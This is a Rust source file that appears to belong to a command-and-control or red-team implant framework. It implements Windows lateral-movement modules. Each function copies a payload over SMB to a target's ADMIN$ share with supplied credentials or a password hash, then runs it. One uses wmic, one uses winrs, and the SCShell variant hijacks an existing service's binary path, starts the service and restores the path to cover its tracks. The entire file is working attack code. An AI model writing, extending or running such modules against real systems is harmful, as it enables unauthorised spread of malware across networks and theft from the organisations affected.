//! WMI/SCShell/WinRM jump modules (Windows only).

use super::{JumpParams, JumpResult};

#[cfg(windows)]
use std::process::Command;

#[cfg(windows)]
pub fn execute(params: &JumpParams, payload: &[u8]) -> JumpResult {
    let target = &params.target;
    if target.is_empty() {
        return JumpResult::Failed { error: "target is required".into() };
    }

    let remote_path = format!("\\\\{}\\ADMIN$\\{}.exe", target, params.child_session_id);
    if let Err(e) = super::psexec::smb_copy(target, &params.user, &params.password, &params.hash, payload, &remote_path) {
        return JumpResult::Failed { error: format!("SMB copy failed: {}", e) };
    }

    let exe_path = format!("C:\\Windows\\{}.exe", params.child_session_id);
    let wmic = Command::new("cmd")
        .args(["/c", &format!(
            "wmic /node:{} process call create \"{}\"",
            target, exe_path
        )])
        .output();

    match wmic {
        Err(e) => JumpResult::Failed { error: format!("wmic failed: {}", e) },
        Ok(out) if !out.status.success() => {
            let stderr = String::from_utf8_lossy(&out.stderr);
            JumpResult::Failed { error: format!("wmic error: {}", stderr.trim()) }
        }
        Ok(_) => JumpResult::Success { remote_path },
    }
}

#[cfg(windows)]
pub fn execute_scshell(params: &JumpParams, payload: &[u8]) -> JumpResult {
    let target  = &params.target;
    let service = if params.service.is_empty() { "XblAuthManager" } else { &params.service };

    if target.is_empty() {
        return JumpResult::Failed { error: "target is required".into() };
    }

    let remote_path = format!("\\\\{}\\ADMIN$\\{}.exe", target, params.child_session_id);
    if let Err(e) = super::psexec::smb_copy(target, &params.user, &params.password, &params.hash, payload, &remote_path) {
        return JumpResult::Failed { error: format!("SMB copy failed: {}", e) };
    }

    let exe_path = format!("C:\\Windows\\{}.exe", params.child_session_id);

    // SCShell: modify existing service binary path, start it, restore
    let sc_qc = Command::new("cmd")
        .args(["/c", &format!("sc \\\\{} qc {}", target, service)])
        .output();

    let original_binpath = match sc_qc {
        Ok(out) if out.status.success() => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            stdout.lines()
                .find(|l| l.contains("BINARY_PATH_NAME"))
                .and_then(|l| l.split(':').nth(1))
                .map(|s| s.trim().to_string())
                .unwrap_or_default()
        }
        _ => String::new(),
    };

    // Change binPath to our payload
    let sc_config = Command::new("cmd")
        .args(["/c", &format!(
            "sc \\\\{} config {} binPath= \"{}\"",
            target, service, exe_path
        )])
        .output();

    if let Ok(out) = &sc_config {
        if !out.status.success() {
            let stderr = String::from_utf8_lossy(&out.stderr);
            return JumpResult::Failed { error: format!("sc config failed: {}", stderr.trim()) };
        }
    }

    // Start the hijacked service
    let _ = Command::new("cmd")
        .args(["/c", &format!("sc \\\\{} start {}", target, service)])
        .output();

    // Restore original binPath
    if !original_binpath.is_empty() {
        let _ = Command::new("cmd")
            .args(["/c", &format!(
                "sc \\\\{} config {} binPath= \"{}\"",
                target, service, original_binpath
            )])
            .output();
    }

    JumpResult::Success { remote_path }
}

#[cfg(windows)]
pub fn execute_winrm(params: &JumpParams, payload: &[u8]) -> JumpResult {
    let target = &params.target;
    if target.is_empty() {
        return JumpResult::Failed { error: "target is required".into() };
    }

    let remote_path = format!("\\\\{}\\ADMIN$\\{}.exe", target, params.child_session_id);
    if let Err(e) = super::psexec::smb_copy(target, &params.user, &params.password, &params.hash, payload, &remote_path) {
        return JumpResult::Failed { error: format!("SMB copy failed: {}", e) };
    }

    let exe_path = format!("C:\\Windows\\{}.exe", params.child_session_id);
    let winrs = Command::new("winrs")
        .args([
            "-r", target,
            "-u", &params.user,
            "-p", &params.password,
            &format!("cmd /c start /b {}", exe_path),
        ])
        .output();

    match winrs {
        Err(e) => JumpResult::Failed { error: format!("winrs failed: {}", e) },
        Ok(out) if !out.status.success() => {
            let stderr = String::from_utf8_lossy(&out.stderr);
            JumpResult::Failed { error: format!("winrs error: {}", stderr.trim()) }
        }
        Ok(_) => JumpResult::Success { remote_path },
    }
}
